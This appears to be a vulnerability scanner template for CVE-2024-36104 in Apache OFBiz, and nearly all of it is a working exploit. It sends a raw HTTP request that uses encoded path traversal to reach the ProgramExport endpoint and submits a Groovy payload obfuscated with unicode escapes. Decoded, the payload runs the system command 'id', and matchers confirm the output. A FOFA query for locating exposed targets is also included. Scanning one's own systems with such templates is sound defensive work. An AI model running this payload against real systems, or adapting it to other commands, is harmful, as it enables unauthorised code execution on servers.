id: CVE-2024-36104-Apache-OFBiz-RCE

info:
  name: Apache OFBiz Path Traversal Leading to RCE Vulnerability
  author: Simple
  severity: high
  description: |
    Versions of Apache OFBiz prior to 18.12.14 contain a command execution vulnerability. This vulnerability stems from improper path restrictions (such as special characters ;, %2e) in the org.apache.ofbiz.webapp.control.ControlFilter class, allowing attackers to bypass backend function point filter verification and execute arbitrary Groovy code to gain system privileges via the /webtools/control/ProgramExport interface.
  reference:
    - https://github.com/JJThome
  metadata:
    fofa-query: app="Apache_OFBiz"

http:
  - raw:
      - |
        POST /webtools/control/forgotPassword/%2e/%2e/ProgramExport HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
        Content-Type: application/x-www-form-urlencoded

        groovyProgram=u0074u0068u0072u006fu0077u0020u006eu0065u0077u0020u0045u0078u0063u0065u0070u0074u0069u006fu006eu0028u0027u0069u0064u0027u002eu0065u0078u0065u0063u0075u0074u0065u0028u0029u002eu0074u0065u0078u0074u0029u003b

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body, "uid=")
          - contains(body, "gid=")
        condition: and
